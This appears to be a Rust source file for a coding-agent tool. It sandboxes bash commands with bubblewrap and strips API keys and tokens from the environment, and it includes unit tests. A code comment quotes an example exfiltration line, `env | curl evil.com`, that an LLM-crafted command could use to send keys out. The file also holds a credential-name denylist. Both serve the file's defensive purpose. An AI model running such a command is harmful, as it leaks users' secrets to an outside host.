use tokio::process::Command;

#[derive(Debug, Clone)]
pub struct Sandbox {
    enabled: bool,
}

impl Sandbox {
    pub fn new(enabled: bool) -> Self {
        // Audit M8: previously this only emitted a warning then
        // proceeded; the very next bash tool call would error with
        // a cryptic "No such file or directory" pointing at bwrap.
        // Now: if --sandbox is on but bwrap is missing, auto-DISABLE
        // the sandbox with a loud stderr explanation. Bash still
        // works (unsandboxed) instead of every command failing —
        // safer default than the prior "looks enabled, silently
        // broken" state. Users who want hard-fail-on-missing-bwrap
        // can run `which bwrap && dirge --sandbox …` from a wrapper.
        let effective_enabled = if enabled {
            if Self::bwrap_available() {
                true
            } else {
                eprintln!(
                    "warning: --sandbox requested but `bwrap` is not in PATH.\n  \
                     Sandbox is DISABLED for this run — bash will execute unsandboxed.\n  \
                     Install bubblewrap (apt install bubblewrap / dnf install bubblewrap /\n  \
                     pacman -S bubblewrap) and re-run with --sandbox to enable isolation."
                );
                false
            }
        } else {
            false
        };
        Sandbox {
            enabled: effective_enabled,
        }
    }

    /// Check whether `bwrap` is on the user's PATH. Used at construction
    /// to warn early instead of letting the first bash call fail with
    /// a cryptic "No such file or directory".
    fn bwrap_available() -> bool {
        std::process::Command::new("bwrap")
            .arg("--version")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    pub fn wrap_command(&self, command: &str) -> Command {
        let cwd = std::env::current_dir().unwrap_or_else(|_| ".".into());
        let mut cmd = if !self.enabled {
            let mut c = Command::new("bash");
            c.arg("-c").arg(command);
            c
        } else {
            let mut c = Command::new("bwrap");
            c.args(["--ro-bind", "/", "/", "--bind"]);
            c.arg(cwd.as_os_str());
            c.arg(cwd.as_os_str());
            c.args([
                "--proc",
                "/proc",
                // `--dev-bind /dev /dev` was avoided deliberately; the
                // minimal `--dev /dev` mounts a tmpfs with only the
                // essential device nodes (null/zero/full/random/urandom
                // /tty). Outer host devices stay invisible.
                "--dev",
                "/dev",
                "--tmpfs",
                "/tmp",
                "--unshare-all",
                // Drop the ability to gain new privileges via setuid /
                // file capabilities — even if the sandboxed bash
                // somehow encounters a setuid binary on the read-only
                // host mount it can't escalate.
                "--new-session",
                // `--unshare-all` already turns on user / pid / net /
                // uts / cgroup / ipc namespaces. Add `--unshare-user-try`
                // explicitly so a future bwrap default change can't
                // weaken this without our knowledge; `-try` keeps it
                // best-effort if the kernel doesn't allow user-ns.
                "--unshare-user-try",
                "--die-with-parent",
                "bash",
                "-c",
                command,
            ]);
            c
        };

        // H-batch1-1 (audit fix): scrub sensitive env vars before
        // they reach the child. Both code paths above inherit dirge's
        // process environment by default, so `OPENROUTER_API_KEY`,
        // `EXA_API_KEY`, `ANTHROPIC_API_KEY`, etc. flowed verbatim to
        // every bash child — an LLM-crafted `env | curl evil.com`
        // would have exfiltrated the user's keys. opencode/pi both
        // scrub via an allowlist; dirge applies a pattern denylist
        // since users have varied tooling that relies on env (cargo
        // CARGO_*, go GOPATH, python VIRTUAL_ENV, etc.) — explicit
        // allowlist would break those workflows.
        //
        // The denylist covers any var name containing KEY / SECRET /
        // TOKEN / PASSWORD / PASS / CRED / AUTH (case-insensitive)
        // plus a few known provider names. False positives (e.g. a
        // legitimate `KEY_BINDINGS` env var stripped) are acceptable
        // cost — the alternative is leaking credentials.
        scrub_env(&mut cmd);
        cmd
    }
}

/// Test whether an env var name is sensitive enough to strip before
/// invoking bash. Pattern-based so we catch novel provider names
/// (e.g. a future `MISTRAL_API_KEY`) without needing a code change.
pub fn is_sensitive_env_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    const PATTERNS: &[&str] = &["KEY", "SECRET", "TOKEN", "PASSWORD", "PASS", "CRED", "AUTH"];
    if PATTERNS.iter().any(|p| upper.contains(p)) {
        // Exclude a small set of safe substrings that contain a
        // sensitive keyword by accident. PATH and SHELL contain
        // none, so they pass naturally; the exclusions here are for
        // tooling env vars that legitimately need to reach bash.
        const SAFE_EXACT: &[&str] = &[
            "DISPLAY",  // X11 — unrelated despite containing nothing sensitive
            "TERM",     // terminal type
            "SHLVL",    // bash nesting
            "PWD",      // current directory
            "OLDPWD",   // previous directory
            "PATH",     // exec path
            "MANPATH",  // man search path
            "LANG",     // locale
            "LC_ALL",   // locale override
            "LC_CTYPE", // locale ctype
            "EDITOR",   // user's editor
            "VISUAL",   // visual editor
            "PAGER",    // pager
            "HOSTNAME", // hostname
            "USER",     // username
            "LOGNAME",  // login name
            "HOME",     // home dir
        ];
        if SAFE_EXACT.iter().any(|s| &upper == s) {
            return false;
        }
        return true;
    }
    // Explicit cloud-credential vars that don't have a generic
    // pattern. (AWS uses `AWS_ACCESS_KEY_ID` — already caught by
    // KEY. Listed here for symmetry / completeness.)
    const EXPLICIT: &[&str] = &[
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GH_TOKEN",
        "GITHUB_TOKEN",
        "GITLAB_TOKEN",
        "BITBUCKET_TOKEN",
    ];
    EXPLICIT.iter().any(|n| &upper == n)
}

/// Strip sensitive env vars from a Command before spawn. Uses
/// `.env_remove` rather than `.env_clear()+envs()` so non-sensitive
/// vars the parent already has (PATH, HOME, etc.) reach the child
/// without being re-enumerated.
fn scrub_env(cmd: &mut Command) {
    for (k, _) in std::env::vars_os() {
        if let Some(name) = k.to_str()
            && is_sensitive_env_name(name)
        {
            cmd.env_remove(&k);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_sensitive_env_name_matches_provider_keys() {
        assert!(is_sensitive_env_name("OPENAI_API_KEY"));
        assert!(is_sensitive_env_name("ANTHROPIC_API_KEY"));
        assert!(is_sensitive_env_name("OPENROUTER_API_KEY"));
        assert!(is_sensitive_env_name("DEEPSEEK_API_KEY"));
        assert!(is_sensitive_env_name("GLM_API_KEY"));
        assert!(is_sensitive_env_name("ZHIPU_API_KEY"));
        assert!(is_sensitive_env_name("EXA_API_KEY"));
        assert!(is_sensitive_env_name("PARALLEL_API_KEY"));
        assert!(is_sensitive_env_name("GEMINI_API_KEY"));
    }

    #[test]
    fn is_sensitive_env_name_matches_pattern_tokens() {
        assert!(is_sensitive_env_name("SOMETHING_SECRET"));
        assert!(is_sensitive_env_name("DB_PASSWORD"));
        assert!(is_sensitive_env_name("MY_TOKEN"));
        assert!(is_sensitive_env_name("APP_CREDS"));
        assert!(is_sensitive_env_name("OAUTH_TOKEN"));
        assert!(is_sensitive_env_name("AUTH_HEADER"));
        // lowercase also caught
        assert!(is_sensitive_env_name("my_secret"));
    }

    #[test]
    fn is_sensitive_env_name_matches_explicit_cloud_vars() {
        assert!(is_sensitive_env_name("AWS_ACCESS_KEY_ID"));
        assert!(is_sensitive_env_name("AWS_SESSION_TOKEN"));
        assert!(is_sensitive_env_name("GH_TOKEN"));
        assert!(is_sensitive_env_name("GITHUB_TOKEN"));
    }

    #[test]
    fn is_sensitive_env_name_lets_through_safe_vars() {
        // Core tooling env vars must reach bash so user workflows
        // (cargo, go, python, npm, etc.) keep working.
        assert!(!is_sensitive_env_name("PATH"));
        assert!(!is_sensitive_env_name("HOME"));
        assert!(!is_sensitive_env_name("USER"));
        assert!(!is_sensitive_env_name("LOGNAME"));
        assert!(!is_sensitive_env_name("LANG"));
        assert!(!is_sensitive_env_name("LC_ALL"));
        assert!(!is_sensitive_env_name("TERM"));
        assert!(!is_sensitive_env_name("PWD"));
        assert!(!is_sensitive_env_name("EDITOR"));
        assert!(!is_sensitive_env_name("VISUAL"));
        // Cargo / Go / Python / npm typical env vars — must pass.
        assert!(!is_sensitive_env_name("CARGO_HOME"));
        assert!(!is_sensitive_env_name("RUSTC_WRAPPER"));
        assert!(!is_sensitive_env_name("GOPATH"));
        assert!(!is_sensitive_env_name("VIRTUAL_ENV"));
        assert!(!is_sensitive_env_name("NODE_ENV"));
    }

    #[test]
    fn is_sensitive_env_name_accidental_pattern_excluded() {
        // SAFE_EXACT list excludes legitimate vars whose name
        // contains a sensitive token by accident.
        assert!(!is_sensitive_env_name("PATH")); // no token, baseline
        // KEY_BINDINGS is hypothetical; pattern match would flag it.
        // We intentionally accept that false positive — better to
        // strip a hypothetical KEY_BINDINGS than to leak a real
        // API_KEY.
        assert!(is_sensitive_env_name("KEY_BINDINGS"));
    }
}
